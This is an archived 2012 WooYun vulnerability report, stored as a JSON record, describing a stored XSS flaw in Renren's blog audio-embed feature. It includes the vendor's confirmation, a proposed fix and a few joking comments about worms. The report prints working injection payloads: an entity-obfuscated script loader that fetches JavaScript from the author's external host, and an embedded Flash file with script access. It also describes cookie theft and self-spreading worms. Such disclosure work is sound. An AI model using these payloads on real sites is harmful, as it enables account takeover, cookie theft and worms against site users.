{"id": 17426, "wybug_id": "wooyun-2012-010719", "wybug_title": "人人网日志功能存储型XSS", "wybug_corp": "人人网", "wybug_author": "gainover", "wybug_date": "2012-08-09 02:17", "wybug_open_date": "2012-09-23 02:18", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-23：\t细节向公众公开  简要描述： 人人回来了～ 前来祝贺的～ 详细说明：  大致流程如下：1. 首先，我们发表一个正常的日志，添加视频/音频，因为想试试能不能直接调用外部FLASH，因此输入http://xsst.sinaapp.com/Xss.swf#.mp3进行测试\n\n2. 发布成功后，我们可以看到出现一个MP3播放器。于是在源码里找找我们输出的内容。3. 搜索xsst(我FLASH文件的网址的特征), 没找到embed标签，但是却定位到了一个img标签，而且我们所输入的内容，放在了img的alt标签。\n\n4. 到这里我们可以大胆猜测。人人的开发人员，肯定是先读取页面里的img标签，然后获取alt属性，最后再 innerHTML=\"<embed src='\"+img.alt+\"'.....></embed>\" 的方式输出内容。5. 我们定位到FLASH文件上，不难看到，确实是如此。\n\n6. 既然如此，如果人人的开发人员，在获取alt属性之后，alt属性里的&quot;等会自动转义为\"等字符， 如果没有进行二次过滤，就直接innerHTML输出的话，就会导致XSS。7. 先试下，会“侧漏“不～～～抓包，字段body从\n<p><img title=\"audio-media\" class=\"audio\" src=\"http://s.xnimg.cn/imgpro/editor/audio.gif\" border=\"0\" alt=\"mp3;http://xsst.sinaapp.com/Xss.swf#.mp3\" /></p>\n修改为\n<p><img title=\"audio-media\" class=\"audio\" src=\"http://s.xnimg.cn/imgpro/editor/audio.gif\" border=\"0\" alt=\"mp3;http://xsst.sinaapp.com/Xss.swf&quot;&gt;#.mp3\" /></p>\n8. 果然从 #.mp3处侧漏啦，有戏～\n\n9. 继续构造利用代码。用俺工具，经过2步转换得到利用代码 （工具地址：http://app.baidu.com/app/enter?appid=280383） 分享下，不算广告吧= = 步骤一：\n\n步骤二：\n\n得到的利用代码如下：\n<p><img title=\"audio-media\" class=\"audio\" src=\"http://s.xnimg.cn/imgpro/editor/audio.gif\" border=\"0\" alt=\"mp3;http://xsst.sinaapp.com/Xss.swf&quot;&gt;&#60;&#105;&#109;&#103;&#47;&#115;&#114;&#99;&#61;&#49;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#40;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#40;&#41;&#123;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#115;&#61;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#83;&#116;&#114;&#105;&#110;&#103;&#46;&#102;&#114;&#111;&#109;&#67;&#104;&#97;&#114;&#67;&#111;&#100;&#101;&#40;&#49;&#49;&#53;&#44;&#57;&#57;&#44;&#49;&#49;&#52;&#44;&#49;&#48;&#53;&#44;&#49;&#49;&#50;&#44;&#49;&#49;&#54;&#41;&#41;&#59;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#115;&#46;&#115;&#114;&#99;&#61;&#83;&#116;&#114;&#105;&#110;&#103;&#46;&#102;&#114;&#111;&#109;&#67;&#104;&#97;&#114;&#67;&#111;&#100;&#101;&#40;&#49;&#48;&#52;&#44;&#49;&#49;&#54;&#44;&#49;&#49;&#54;&#44;&#49;&#49;&#50;&#44;&#53;&#56;&#44;&#52;&#55;&#44;&#52;&#55;&#44;&#49;&#50;&#48;&#44;&#49;&#49;&#53;&#44;&#49;&#49;&#53;&#44;&#49;&#49;&#54;&#44;&#52;&#54;&#44;&#49;&#49;&#53;&#44;&#49;&#48;&#53;&#44;&#49;&#49;&#48;&#44;&#57;&#55;&#44;&#57;&#55;&#44;&#49;&#49;&#50;&#44;&#49;&#49;&#50;&#44;&#52;&#54;&#44;&#57;&#57;&#44;&#49;&#49;&#49;&#44;&#49;&#48;&#57;&#44;&#52;&#55;&#44;&#49;&#49;&#48;&#44;&#49;&#49;&#49;&#44;&#52;&#54;&#44;&#49;&#48;&#54;&#44;&#49;&#49;&#53;&#41;&#59;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#115;&#41;&#125;&#41;&#40;&#41;&#62;#.mp3\" /></p>\n10. 可是意外出现啦，看来人人网在服务器上还做了某些判断，俺的代码出发了它们的过滤规则，有以下提示信息。\n\n11. 但是这个阻碍不了我们前进的步伐，既然如此，那我们就换个方式，直接用flash来，构造以下利用代码。\n<p><img title=\"audio-media\" class=\"audio\" src=\"http://s.xnimg.cn/imgpro/editor/audio.gif\" border=\"0\" alt=\"mp3;http://itsokla.duapp.com/Xss.swf&quot;></object><embed src=&quot;http://itsokla.duapp.com/Xss.swf&quot;type=&quot;application/x-shockwave-flash&quot;allowscriptaccess=&quot;always&quot;><i a=&quot;#.mp3\" /></p>\n12. 可以看到成功发表日志。\n\n\n\n13. httpwatch对日志页面抓包可以看到，成功通过FLASH调用外部JS文件。\n\n14. 至于漏洞危害：A. 由于发布日志无验证码，且和XSS处于同一个域下，因而可以直接ajax让受害者自动发布日志，从而进行日志蠕虫B. 人人网的cookies没有加http-only防护，因而可以得到cookies后，在其它域做某些某些事情。举个例子，比如我就用这个XSS让访问日志的用户，自动进行某个第三方应用的Oauth的认证。这里就不给出具体的利用代码了 。。以下是获取他人cookies的截图： （未做有害事情，仅测试用途）\n\n   漏洞证明：  见详细说明   修复方案：  在获取日志内容中<img class=\"audio\" src=\"http://s.xnimg.cn/imgpro/editor/audio.gif\" border=\"0\" alt=\"mp3;mp3地址\"> 标记的 alt 属性后， 对值进行再次过滤，再以innerHTML方式输出。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-08-09 05:42 厂商回复： 很巧妙，感谢! 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-08-09 08:11 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  搞个蠕虫收集信息多好！    \n     2012-08-09 09:05 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  @风萧萧 xss你让人家收集信息，sql注入你让人家脱裤，诶，好坏好坏    \n     2012-08-09 10:33 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @saline 这孩子的确不是一点点坏~~    \n     2012-08-09 12:06 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @saline @se55i0n 毛主席说，风萧萧是个好壮士！    \n     2012-08-29 18:35 |    \t\ticefish \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:8        | 欢迎大家和我用邮件进行交流~)\t\t \n  非常巧妙    \n     2012-09-23 10:49 |    \t\txiaokinghk \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:16        | 【DBA】)\t\t \n  @风萧萧 表认同，，，，，    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}